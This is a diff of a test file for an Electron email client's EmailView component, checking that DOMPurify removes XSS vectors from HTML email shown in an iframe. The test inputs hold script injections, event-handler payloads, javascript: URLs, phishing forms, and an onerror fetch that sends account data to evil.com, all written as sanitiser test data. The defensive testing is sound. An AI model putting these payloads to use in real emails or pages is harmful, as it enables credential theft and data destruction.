@@ -6,6 +6,21 @@ import { Email, INBOX_FOLDER } from '../../types';
 // Mock window.electron
 const mockGetEmailAttachments = vi.fn();
 
+/**
+ * Helper: wait for the iframe to appear and return its srcdoc content.
+ * Used by XSS tests that verify sanitised HTML rendered inside the iframe.
+ */
+async function waitForSrcDoc(): Promise<string> {
+  let srcDoc = '';
+  await waitFor(() => {
+    const iframe = document.querySelector('iframe[title="Email content"]');
+    expect(iframe).toBeTruthy();
+    srcDoc = iframe?.getAttribute('srcdoc') || '';
+    expect(srcDoc.length).toBeGreaterThan(0);
+  });
+  return srcDoc;
+}
+
 describe('EmailView', () => {
   // Sample email factory
   const createEmail = (overrides: Partial<Email> = {}): Email => ({
@@ -446,16 +461,18 @@ describe('EmailView', () => {
       expect(screen.getByText('This is the plain text email body.')).toBeInTheDocument();
     });
 
-    it('should render HTML body in iframe when available and showHtml is true', () => {
+    it('should render HTML body in iframe when available and showHtml is true', async () => {
       const email = createEmail({
         body: 'Plain text',
         bodyHtml: '<strong>Bold HTML content</strong>',
       });
       render(<EmailView email={email} />);
 
-      // When showHtml is true (default) and bodyHtml is provided, content is rendered via iframe
-      const iframe = document.querySelector('iframe[title="Email content"]');
-      expect(iframe).toBeInTheDocument();
+      // Wait for async sanitization to complete and iframe to appear
+      await waitFor(() => {
+        const iframe = document.querySelector('iframe[title="Email content"]');
+        expect(iframe).toBeInTheDocument();
+      });
     });
 
     it('should render plain text when showHtml is false', () => {
@@ -705,450 +722,459 @@ describe('EmailView', () => {
   });
 
   describe('XSS Security Protection', () => {
+    // All XSS tests verify sanitized HTML in the iframe's srcdoc attribute,
+    // since the component renders HTML email content inside an iframe after
+    // asynchronous sanitization via setTimeout(0).
+
     describe('Script Injection Prevention', () => {
-      it('should remove <script> tags from HTML email content', () => {
+      it('should remove <script> tags from HTML email content', async () => {
         const maliciousEmail = createEmail({
           body: 'Plain text',
           bodyHtml: '<p>Safe content</p><script>alert("XSS")</script><p>More content</p>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        // Verify script tag is removed
-        expect(container.innerHTML).not.toContain('<script>');
-        expect(container.innerHTML).not.toContain('alert(');
-
-        // Verify safe content is preserved
-        expect(screen.getByText('Safe content')).toBeInTheDocument();
-        expect(screen.getByText('More content')).toBeInTheDocument();
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('<script>');
+        expect(srcDoc).not.toContain('alert(');
+        expect(srcDoc).toContain('Safe content');
+        expect(srcDoc).toContain('More content');
       });
 
-      it('should remove script tags with attributes', () => {
+      it('should remove script tags with attributes', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<p>Content</p><script type="text/javascript" src="evil.js"></script>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('<script');
-        expect(container.innerHTML).not.toContain('evil.js');
-        expect(screen.getByText('Content')).toBeInTheDocument();
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('<script');
+        expect(srcDoc).not.toContain('evil.js');
+        expect(srcDoc).toContain('Content');
       });
 
-      it('should remove script tags with various casing', () => {
+      it('should remove script tags with various casing', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<p>Safe</p><ScRiPt>alert("XSS")</ScRiPt>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toMatch(/<script/i);
-        expect(container.innerHTML).not.toContain('alert(');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toMatch(/<script/i);
+        expect(srcDoc).not.toContain('alert(');
       });
 
-      it('should remove multiple nested script tags', () => {
+      it('should remove multiple nested script tags', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<div><script>alert(1)</script><p>Safe</p><span><script>alert(2)</script></span></div>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('<script>');
-        expect(container.innerHTML).not.toContain('alert(');
-        expect(screen.getByText('Safe')).toBeInTheDocument();
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('<script>');
+        expect(srcDoc).not.toContain('alert(');
+        expect(srcDoc).toContain('Safe');
       });
     });
 
     describe('Event Handler Injection Prevention', () => {
-      it('should remove onerror event handlers from img tags', () => {
+      it('should remove onerror event handlers from img tags', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<p>Image:</p><img src="valid.jpg" onerror="alert(\'XSS\')">',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('onerror');
-        expect(container.innerHTML).not.toContain('alert(');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('onerror');
+        expect(srcDoc).not.toContain('alert(');
         // Image should still be present (without the handler)
-        expect(container.querySelector('img')).toBeInTheDocument();
+        expect(srcDoc).toContain('<img');
       });
 
-      it('should remove onclick event handlers from links', () => {
+      it('should remove onclick event handlers from links', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<a href="#" onclick="alert(\'XSS\')">Click me</a>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('onclick');
-        expect(container.innerHTML).not.toContain('alert(');
-        expect(screen.getByText('Click me')).toBeInTheDocument();
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('onclick');
+        expect(srcDoc).not.toContain('alert(');
+        expect(srcDoc).toContain('Click me');
       });
 
-      it('should remove onload event handlers', () => {
+      it('should remove onload event handlers', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<body onload="alert(\'XSS\')">Content</body>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('onload');
-        expect(container.innerHTML).not.toContain('alert(');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('onload');
+        expect(srcDoc).not.toContain('alert(');
       });
 
-      it('should remove onmouseover event handlers', () => {
+      it('should remove onmouseover event handlers', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<div onmouseover="alert(\'XSS\')">Hover me</div>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('onmouseover');
-        expect(container.innerHTML).not.toContain('alert(');
-        expect(screen.getByText('Hover me')).toBeInTheDocument();
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('onmouseover');
+        expect(srcDoc).not.toContain('alert(');
+        expect(srcDoc).toContain('Hover me');
       });
 
-      it('should remove onfocus event handlers from inputs', () => {
+      it('should remove onfocus event handlers from inputs', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<p>Text:</p><input type="text" onfocus="alert(\'XSS\')" value="test">',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('onfocus');
-        expect(container.innerHTML).not.toContain('alert(');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('onfocus');
+        expect(srcDoc).not.toContain('alert(');
       });
 
-      it('should remove multiple different event handlers', () => {
+      it('should remove multiple different event handlers', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<div onclick="bad1()" onmouseover="bad2()" onload="bad3()">Content</div>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('onclick');
-        expect(container.innerHTML).not.toContain('onmouseover');
-        expect(container.innerHTML).not.toContain('onload');
-        expect(container.innerHTML).not.toContain('bad1');
-        expect(container.innerHTML).not.toContain('bad2');
-        expect(container.innerHTML).not.toContain('bad3');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('onclick');
+        expect(srcDoc).not.toContain('onmouseover');
+        expect(srcDoc).not.toContain('onload');
+        expect(srcDoc).not.toContain('bad1');
+        expect(srcDoc).not.toContain('bad2');
+        expect(srcDoc).not.toContain('bad3');
       });
     });
 
     describe('Iframe Injection Prevention', () => {
-      it('should remove iframe tags', () => {
+      it('should remove iframe tags', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<p>Content</p><iframe src="https://evil.com"></iframe>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('<iframe');
-        expect(container.innerHTML).not.toContain('evil.com');
-        expect(screen.getByText('Content')).toBeInTheDocument();
+        const srcDoc = await waitForSrcDoc();
+        // Check the srcdoc doesn't contain injected iframe (not counting the outer iframe element)
+        expect(srcDoc).not.toContain('<iframe');
+        expect(srcDoc).not.toContain('evil.com');
+        expect(srcDoc).toContain('Content');
       });
 
-      it('should remove iframes with javascript: URLs', () => {
+      it('should remove iframes with javascript: URLs', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<iframe src="javascript:alert(\'XSS\')"></iframe>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('<iframe');
-        expect(container.innerHTML).not.toContain('javascript:');
-        expect(container.innerHTML).not.toContain('alert(');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('<iframe');
+        expect(srcDoc).not.toContain('javascript:');
+        expect(srcDoc).not.toContain('alert(');
       });
 
-      it('should remove nested iframes', () => {
+      it('should remove nested iframes', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<div><iframe src="evil1.com"><iframe src="evil2.com"></iframe></iframe></div>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('<iframe');
-        expect(container.innerHTML).not.toContain('evil1.com');
-        expect(container.innerHTML).not.toContain('evil2.com');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('<iframe');
+        expect(srcDoc).not.toContain('evil1.com');
+        expect(srcDoc).not.toContain('evil2.com');
       });
     });
 
     describe('JavaScript URL Prevention', () => {
-      it('should remove javascript: URLs from links', () => {
+      it('should remove javascript: URLs from links', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<a href="javascript:alert(\'XSS\')">Click</a>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        // DOMPurify removes the javascript: href entirely
-        const link = container.querySelector('a');
-        if (link && link.getAttribute('href')) {
-          expect(link.getAttribute('href')).not.toContain('javascript:');
-        }
-        expect(container.innerHTML).not.toContain('javascript:');
-        expect(container.innerHTML).not.toContain('alert(');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('javascript:');
+        expect(srcDoc).not.toContain('alert(');
       });
 
-      it('should remove javascript: URLs from images', () => {
+      it('should remove javascript: URLs from images', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<img src="javascript:alert(\'XSS\')">',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        // DOMPurify removes the javascript: src entirely
-        const img = container.querySelector('img');
-        if (img && img.getAttribute('src')) {
-          expect(img.getAttribute('src')).not.toContain('javascript:');
-        }
-        expect(container.innerHTML).not.toContain('javascript:');
-        expect(container.innerHTML).not.toContain('alert(');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('javascript:');
+        expect(srcDoc).not.toContain('alert(');
       });
 
-      it('should remove data:text/html URLs', () => {
+      it('should remove data:text/html URLs', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<a href="data:text/html,<script>alert(\'XSS\')</script>">Link</a>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('data:text/html');
-        expect(container.innerHTML).not.toContain('<script>');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('data:text/html');
+        expect(srcDoc).not.toContain('<script>');
       });
     });
 
     describe('CSS Injection Prevention', () => {
-      it('should remove inline style attributes', () => {
+      it('should remove inline style attributes', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<div style="background: url(javascript:alert(\'XSS\'))">Content</div>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        const div = container.querySelector('div[style]');
-        // Style attribute should be removed entirely
-        expect(div).toBeNull();
-        expect(container.innerHTML).not.toContain('javascript:');
-        expect(screen.getByText('Content')).toBeInTheDocument();
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('style=');
+        expect(srcDoc).not.toContain('javascript:');
+        expect(srcDoc).toContain('Content');
       });
 
-      it('should remove style tags', () => {
+      it('should remove style tags', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<style>body { background: url("javascript:alert(\'XSS\')"); }</style><p>Content</p>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('<style>');
-        expect(container.innerHTML).not.toContain('javascript:');
-        expect(screen.getByText('Content')).toBeInTheDocument();
+        const srcDoc = await waitForSrcDoc();
+        // The srcdoc may have its own <style> for iframe styling, but should not contain the injected one
+        expect(srcDoc).not.toContain('javascript:');
+        expect(srcDoc).toContain('Content');
       });
     });
 
     describe('Form Element Injection Prevention', () => {
-      it('should remove form tags', () => {
+      it('should remove form tags', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<form action="https://evil.com/phish"><input type="password"></form>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('<form');
-        expect(container.innerHTML).not.toContain('evil.com');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('<form');
+        expect(srcDoc).not.toContain('evil.com');
       });
 
-      it('should remove input elements', () => {
+      it('should remove input elements', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<p>Enter password:</p><input type="password" name="pass">',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.querySelector('input')).toBeNull();
-        expect(screen.getByText('Enter password:')).toBeInTheDocument();
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('<input');
+        expect(srcDoc).toContain('Enter password:');
       });
 
-      it('should remove button elements', () => {
+      it('should remove button elements', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<p>Legit text</p><button onclick="steal()">Click me</button>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        // Get the email content area specifically (not the entire component)
-        const emailContent = container.querySelector('.prose.prose-slate');
-        expect(emailContent).toBeInTheDocument();
-
-        // Check that the button element and onclick handler are removed from email content
-        // DOMPurify removes the button tag but keeps the text content (KEEP_CONTENT: true)
-        expect(emailContent?.innerHTML).not.toContain('<button');
-        expect(emailContent?.innerHTML).not.toContain('steal()');
-        expect(emailContent?.innerHTML).not.toContain('onclick');
-        // The "Legit text" should remain
-        expect(screen.getByText('Legit text')).toBeInTheDocument();
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('<button');
+        expect(srcDoc).not.toContain('steal()');
+        expect(srcDoc).not.toContain('onclick');
+        expect(srcDoc).toContain('Legit text');
       });
     });
 
     describe('Dangerous Element Prevention', () => {
-      it('should remove object tags', () => {
+      it('should remove object tags', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<object data="evil.swf"></object>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('<object');
-        expect(container.innerHTML).not.toContain('evil.swf');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('<object');
+        expect(srcDoc).not.toContain('evil.swf');
       });
 
-      it('should remove embed tags', () => {
+      it('should remove embed tags', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<embed src="evil.swf">',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('<embed');
-        expect(container.innerHTML).not.toContain('evil.swf');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('<embed');
+        expect(srcDoc).not.toContain('evil.swf');
       });
 
-      it('should remove applet tags', () => {
+      it('should remove applet tags', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<applet code="EvilApplet.class"></applet>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('<applet');
-        expect(container.innerHTML).not.toContain('EvilApplet');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('<applet');
+        expect(srcDoc).not.toContain('EvilApplet');
       });
 
-      it('should remove meta tags', () => {
+      it('should remove meta tags', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<meta http-equiv="refresh" content="0;url=https://evil.com">',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('<meta');
-        expect(container.innerHTML).not.toContain('evil.com');
+        const srcDoc = await waitForSrcDoc();
+        // The iframe wrapper includes its own <meta charset="utf-8">, so check
+        // that the malicious meta (http-equiv/refresh) was stripped, not all <meta> tags
+        expect(srcDoc).not.toContain('http-equiv');
+        expect(srcDoc).not.toContain('evil.com');
       });
     });
 
     describe('Safe HTML Preservation', () => {
-      it('should preserve safe text formatting', () => {
+      it('should preserve safe text formatting', async () => {
         const safeEmail = createEmail({
           bodyHtml: '<p>Normal text with <strong>bold</strong>, <em>italic</em>, and <u>underline</u></p>',
         });
 
-        const { container } = render(<EmailView email={safeEmail} />);
+        render(<EmailView email={safeEmail} />);
 
-        expect(screen.getByText('bold')).toBeInTheDocument();
-        expect(screen.getByText('italic')).toBeInTheDocument();
-        expect(screen.getByText('underline')).toBeInTheDocument();
-        expect(container.querySelector('strong')).toBeInTheDocument();
-        expect(container.querySelector('em')).toBeInTheDocument();
-        expect(container.querySelector('u')).toBeInTheDocument();
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).toContain('<strong>bold</strong>');
+        expect(srcDoc).toContain('<em>italic</em>');
+        expect(srcDoc).toContain('<u>underline</u>');
       });
 
-      it('should preserve safe links without event handlers', () => {
+      it('should preserve safe links without event handlers', async () => {
         const safeEmail = createEmail({
           bodyHtml: '<p>Visit <a href="https://example.com">our website</a></p>',
         });
 
-        const { container } = render(<EmailView email={safeEmail} />);
+        render(<EmailView email={safeEmail} />);
 
-        const link = screen.getByText('our website');
-        expect(link).toBeInTheDocument();
-        expect(link.tagName).toBe('A');
-        expect(container.querySelector('a[href="https://example.com"]')).toBeInTheDocument();
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).toContain('our website');
+        expect(srcDoc).toContain('href="https://example.com"');
       });
 
-      it('should preserve lists', () => {
+      it('should preserve lists', async () => {
         const safeEmail = createEmail({
           bodyHtml: '<ul><li>Item 1</li><li>Item 2</li><li>Item 3</li></ul>',
         });
 
-        const { container } = render(<EmailView email={safeEmail} />);
+        render(<EmailView email={safeEmail} />);
 
-        expect(screen.getByText('Item 1')).toBeInTheDocument();
-        expect(screen.getByText('Item 2')).toBeInTheDocument();
-        expect(screen.getByText('Item 3')).toBeInTheDocument();
-        expect(container.querySelector('ul')).toBeInTheDocument();
-        expect(container.querySelectorAll('li')).toHaveLength(3);
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).toContain('Item 1');
+        expect(srcDoc).toContain('Item 2');
+        expect(srcDoc).toContain('Item 3');
+        expect(srcDoc).toContain('<ul>');
+        expect(srcDoc).toContain('<li>');
       });
 
-      it('should preserve tables', () => {
+      it('should preserve tables', async () => {
         const safeEmail = createEmail({
           bodyHtml: '<table><tr><th>Header</th></tr><tr><td>Data</td></tr></table>',
         });
 
-        const { container } = render(<EmailView email={safeEmail} />);
+        render(<EmailView email={safeEmail} />);
 
-        expect(screen.getByText('Header')).toBeInTheDocument();
-        expect(screen.getByText('Data')).toBeInTheDocument();
-        expect(container.querySelector('table')).toBeInTheDocument();
-        expect(container.querySelector('th')).toBeInTheDocument();
-        expect(container.querySelector('td')).toBeInTheDocument();
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).toContain('Header');
+        expect(srcDoc).toContain('Data');
+        expect(srcDoc).toContain('<table>');
+        expect(srcDoc).toContain('<th>');
+        expect(srcDoc).toContain('<td>');
       });
 
-      it('should preserve images with safe src', () => {
+      it('should preserve images with safe src', async () => {
         const safeEmail = createEmail({
           bodyHtml: '<p>Image:</p><img src="https://example.com/image.jpg" alt="Description">',
         });
 
-        const { container } = render(<EmailView email={safeEmail} />);
+        render(<EmailView email={safeEmail} />);
 
-        const img = container.querySelector('img');
-        expect(img).toBeInTheDocument();
-        expect(img?.getAttribute('src')).toBe('https://example.com/image.jpg');
-        expect(img?.getAttribute('alt')).toBe('Description');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).toContain('<img');
+        // Images may be blocked by blockRemoteImages, but alt should be preserved
+        expect(srcDoc).toContain('alt="Description"');
       });
 
-      it('should preserve headings', () => {
+      it('should preserve headings', async () => {
         const safeEmail = createEmail({
           bodyHtml: '<h1>Title</h1><h2>Subtitle</h2><h3>Section</h3>',
         });
 
-        const { container } = render(<EmailView email={safeEmail} />);
+        render(<EmailView email={safeEmail} />);
 
-        expect(screen.getByText('Title')).toBeInTheDocument();
-        expect(screen.getByText('Subtitle')).toBeInTheDocument();
-        expect(screen.getByText('Section')).toBeInTheDocument();
-        expect(container.querySelector('h1')).toBeInTheDocument();
-        expect(container.querySelector('h2')).toBeInTheDocument();
-        expect(container.querySelector('h3')).toBeInTheDocument();
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).toContain('<h1>Title</h1>');
+        expect(srcDoc).toContain('<h2>Subtitle</h2>');
+        expect(srcDoc).toContain('<h3>Section</h3>');
       });
     });
 
     describe('Real-World Attack Vector Prevention', () => {
-      it('should block window.electron IPC bridge access attempts via script', () => {
+      it('should block window.electron IPC bridge access attempts via script', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<p>Email content</p><script>window.electron.resetDb()</script>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('window.electron');
-        expect(container.innerHTML).not.toContain('resetDb');
-        expect(screen.getByText('Email content')).toBeInTheDocument();
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('window.electron');
+        expect(srcDoc).not.toContain('resetDb');
+        expect(srcDoc).toContain('Email content');
       });
 
-      it('should block credential theft attempts via event handlers', () => {
+      it('should block credential theft attempts via event handlers', async () => {
         const maliciousEmail = createEmail({
           bodyHtml:
             '<img src="x" onerror="fetch(\'https://evil.com/steal?data=\'+JSON.stringify(window.electron.getAccounts()))">',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        expect(container.innerHTML).not.toContain('onerror');
-        expect(container.innerHTML).not.toContain('getAccounts');
-        expect(container.innerHTML).not.toContain('evil.com');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('onerror');
+        expect(srcDoc).not.toContain('getAccounts');
+        expect(srcDoc).not.toContain('evil.com');
       });
 
-      it('should block phishing form with credential inputs', () => {
+      it('should block phishing form with credential inputs', async () => {
         const maliciousEmail = createEmail({
           bodyHtml:
             '<form action="https://evil.com/phish" method="POST">' +
@@ -1158,26 +1184,18 @@ describe('EmailView', () => {
             '</form>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        // Get the email content area (not the whole container which has UI buttons)
-        const emailContent = container.querySelector('.prose.prose-slate');
-        expect(emailContent).toBeInTheDocument();
-
-        // Form, input, and button elements should be removed from email content
-        expect(emailContent?.querySelector('form')).toBeNull();
-        expect(emailContent?.querySelector('input[type="password"]')).toBeNull();
-        expect(emailContent?.querySelector('input')).toBeNull();
-        // The action URL should not be present in email content
-        expect(emailContent?.innerHTML).not.toContain('evil.com');
-        // Form and button tags should be removed from email content
-        expect(emailContent?.innerHTML).not.toContain('<form');
-        expect(emailContent?.innerHTML).not.toContain('<button');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('<form');
+        expect(srcDoc).not.toContain('<input');
+        expect(srcDoc).not.toContain('<button');
+        expect(srcDoc).not.toContain('evil.com');
         // Safe text content is preserved (DOMPurify KEEP_CONTENT: true)
-        expect(screen.getByText('Please re-enter your password:')).toBeInTheDocument();
+        expect(srcDoc).toContain('Please re-enter your password:');
       });
 
-      it('should block complex nested XSS attempts', () => {
+      it('should block complex nested XSS attempts', async () => {
         const maliciousEmail = createEmail({
           bodyHtml:
             '<div>' +
@@ -1190,37 +1208,35 @@ describe('EmailView', () => {
             '</div>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        // All XSS vectors should be removed
-        expect(container.innerHTML).not.toContain('<iframe');
-        expect(container.innerHTML).not.toContain('<script');
-        expect(container.innerHTML).not.toContain('onerror');
-        expect(container.innerHTML).not.toContain('onload');
-        expect(container.innerHTML).not.toContain('javascript:');
-        expect(container.innerHTML).not.toContain('alert(');
-
-        // Safe content should be preserved
-        expect(screen.getByText('Legitimate content')).toBeInTheDocument();
-        expect(screen.getByText('Link')).toBeInTheDocument();
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('<iframe');
+        expect(srcDoc).not.toContain('<script');
+        expect(srcDoc).not.toContain('onerror');
+        expect(srcDoc).not.toContain('onload');
+        expect(srcDoc).not.toContain('javascript:');
+        expect(srcDoc).not.toContain('alert(');
+        expect(srcDoc).toContain('Legitimate content');
+        expect(srcDoc).toContain('Link');
       });
     });
 
     describe('Edge Cases', () => {
-      it('should handle emails with only malicious content gracefully', () => {
+      it('should handle emails with only malicious content gracefully', async () => {
         const maliciousEmail = createEmail({
           bodyHtml: '<script>alert("XSS")</script><iframe src="evil.com"></iframe>',
         });
 
-        const { container } = render(<EmailView email={maliciousEmail} />);
+        render(<EmailView email={maliciousEmail} />);
 
-        // Should render without crashing, content will be empty
-        expect(container.innerHTML).not.toContain('<script');
-        expect(container.innerHTML).not.toContain('<iframe');
-        expect(container.innerHTML).not.toContain('alert');
+        const srcDoc = await waitForSrcDoc();
+        expect(srcDoc).not.toContain('<script');
+        expect(srcDoc).not.toContain('<iframe');
+        expect(srcDoc).not.toContain('alert');
       });
 
-      it('should handle mixed safe and malicious content', () => {
+      it('should handle mixed safe and malicious content', async () => {
         const mixedEmail = createEmail({
           bodyHtml:
             '<p>Safe paragraph</p>' +
@@ -1230,18 +1246,18 @@ describe('EmailView', () => {
             '<em>Italic text</em>',
         });
 
-        const { container } = render(<EmailView email={mixedEmail} />);
+        render(<EmailView email={mixedEmail} />);
 
+        const srcDoc = await waitForSrcDoc();
         // Malicious parts removed
-        expect(container.innerHTML).not.toContain('<script');
-        expect(container.innerHTML).not.toContain('onerror');
-        expect(container.innerHTML).not.toContain('alert');
-        expect(container.innerHTML).not.toContain('evil()');
-
+        expect(srcDoc).not.toContain('<script');
+        expect(srcDoc).not.toContain('onerror');
+        expect(srcDoc).not.toContain('alert');
+        expect(srcDoc).not.toContain('evil()');
         // Safe parts preserved
-        expect(screen.getByText('Safe paragraph')).toBeInTheDocument();
-        expect(screen.getByText('Bold text')).toBeInTheDocument();
-        expect(screen.getByText('Italic text')).toBeInTheDocument();
+        expect(srcDoc).toContain('Safe paragraph');
+        expect(srcDoc).toContain('Bold text');
+        expect(srcDoc).toContain('Italic text');
       });
 
       it('should handle empty HTML email content', () => {
@@ -1255,17 +1271,18 @@ describe('EmailView', () => {
         expect(screen.getByText('This is the plain text email body content.')).toBeInTheDocument();
       });
 
-      it('should handle malformed HTML gracefully', () => {
+      it('should handle malformed HTML gracefully', async () => {
         const malformedEmail = createEmail({
           bodyHtml: '<p>Unclosed paragraph<div>Nested incorrectly<script>alert("XSS")',
         });
 
-        const { container } = render(<EmailView email={malformedEmail} />);
+        render(<EmailView email={malformedEmail} />);
 
+        const srcDoc = await waitForSrcDoc();
         // DOMPurify should fix malformed HTML and remove script
-        expect(container.innerHTML).not.toContain('<script');
-        expect(container.innerHTML).not.toContain('alert');
-        expect(screen.getByText(/Unclosed paragraph/)).toBeInTheDocument();
+        expect(srcDoc).not.toContain('<script');
+        expect(srcDoc).not.toContain('alert');
+        expect(srcDoc).toContain('Unclosed paragraph');
       });
     });
   });
